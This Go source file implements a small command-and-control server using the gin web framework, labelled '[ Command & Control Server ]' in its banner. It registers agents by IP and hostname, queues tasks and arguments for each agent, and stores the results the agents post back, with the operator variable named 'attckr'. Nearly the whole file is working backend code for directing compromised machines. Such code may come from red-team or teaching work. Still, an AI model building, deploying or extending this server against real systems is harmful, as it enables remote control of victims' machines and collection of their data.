package main

import (
    "bufio"
    "fmt"
    "math/rand"
    "net/http"
    "os"
    "os/user"
    "strings"
    "time"

    "github.com/gin-gonic/gin"
)

type register struct {
    Name     string `json:"name"`
    IP       string `json:"ip"`
    Hostname string `json:"host"`
    Type     string `json:"type"`
}

type task struct {
    Name string `json:"name"`
    ID   int    `json:"id"`
    Arg1 string `json:"arg1"`
    Arg2 string `json:"arg2"`
}

type result struct {
    Name    string `json:"name"`
    Status  int    `json:"status"`
    Content string `json:"content"`
}

var users []register
var tasks []task
var results []result

func getUsers(c *gin.Context) {
    c.IndentedJSON(http.StatusOK, users)
}

func addUser(c *gin.Context) {
    var newUser register

    if err := c.BindJSON(&newUser); err != nil {
        c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "invalid request payload"})
        return
    }

    newUser.Name = generateRandomString(6)
    newUser.IP = c.ClientIP()
    if newUser.IP == "" {
        c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "failed to detect IP address"})
        return
    }

    for _, user := range users {
        if user.IP == newUser.IP {
            c.IndentedJSON(http.StatusConflict, gin.H{"message": "IP already exists"})
            return
        }
    }

    newUser.Type = "POST"
    users = append(users, newUser)
    fmt.Println(newUser)
    c.IndentedJSON(http.StatusCreated, newUser)
}

func getUserByName(c *gin.Context) {
    name := c.Param("name")

    for _, a := range users {
        if a.Name == name {
            c.IndentedJSON(http.StatusOK, a)
            return
        }
    }
    c.IndentedJSON(http.StatusNotFound, gin.H{"message": "user not found"})
}

func generateRandomString(n int) string {
    const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    rand.Seed(time.Now().UnixNano())
    b := make([]byte, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

func fetchTasks(c *gin.Context) {
    name := c.Param("name")

    var userTasks []task
    for _, a := range tasks {
        if a.Name == name {
            userTasks = append(userTasks, a)
        }
    }
    if len(userTasks) > 0 {
        c.IndentedJSON(http.StatusOK, userTasks)
        return
    }
    c.IndentedJSON(http.StatusNotFound, gin.H{"message": "could not find any tasks..."})
}

func postTask(c *gin.Context) {
    var newTask task
    user := c.Param("name")

    for _, a := range users {
        if a.Name == user {
            if err := c.BindJSON(&newTask); err != nil {
                c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "failed to add new task"})
                return
            }
            newTask.Name = user
            tasks = append(tasks, newTask)
            c.IndentedJSON(http.StatusCreated, gin.H{"message": "added new task to waitlist"})
            return
        }
    }
    c.IndentedJSON(http.StatusNotFound, gin.H{"message": "did not find user with specified name"})
}

func getResults(c *gin.Context) {
    user := c.Param("name")

    for _, a := range results {
        if a.Name == user {
            c.IndentedJSON(http.StatusOK, a)
            return
        }
    }
    c.IndentedJSON(http.StatusNotFound, gin.H{"message": "user not found or no tasks found"})
}

func postResults(c *gin.Context) {
    var newResult result
    user := c.Param("name")

    for _, a := range users {
        if a.Name == user {
            if err := c.BindJSON(&newResult); err != nil {
                c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "failed to add results"})
                return
            }
            newResult.Name = user
            results = append(results, newResult)
            c.IndentedJSON(http.StatusCreated, gin.H{"message": "added new result"})
            return
        }
    }
    c.IndentedJSON(http.StatusNotFound, gin.H{"message": "did not find user with specified name"})
}

func main() {
    var IP string
    var Port string
    config := "conf/network.conf"

    currUser, err := user.Current()
    if err != nil {
        fmt.Println("Failed to fetch current user")
        return
    }
    attckr := currUser.Username

    fmt.Println("---------[ Command & Control Server ]---------")

    if _, err := os.Stat(config); os.IsNotExist(err) {
        fmt.Print("Server IP: ")
        fmt.Scanln(&IP)
        fmt.Print("Server Port: ")
        fmt.Scanln(&Port)
    } else {
        file, err := os.Open(config)
        if err != nil {
            fmt.Println("Error opening file:", err)
            return
        }
        defer file.Close()

        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            line := scanner.Text()
            if strings.HasPrefix(line, "IP:") {
                IP = strings.TrimSpace(strings.TrimPrefix(line, "IP:"))
            } else if strings.HasPrefix(line, "Port:") {
                Port = strings.TrimSpace(strings.TrimPrefix(line, "Port:"))
            }
        }

        if err := scanner.Err(); err != nil {
            fmt.Println("Error reading file:", err)
            return
        }
    }

    router := gin.Default()
    router.LoadHTMLGlob("templates/*")
    router.Static("/static", "./static")
    router.GET("/", func(c *gin.Context) {
        c.HTML(http.StatusOK, "index.html", gin.H{"name": attckr})
    })
    router.GET("/users", getUsers)
    router.POST("/users", addUser)
    router.GET("/users/:name", getUserByName)
    router.GET("/tasks/:name", fetchTasks)
    router.POST("/tasks/:name", postTask)
    router.GET("/results/:name", getResults)
    router.POST("/results/:name", postResults)
    router.Run(IP + ":" + Port)
}

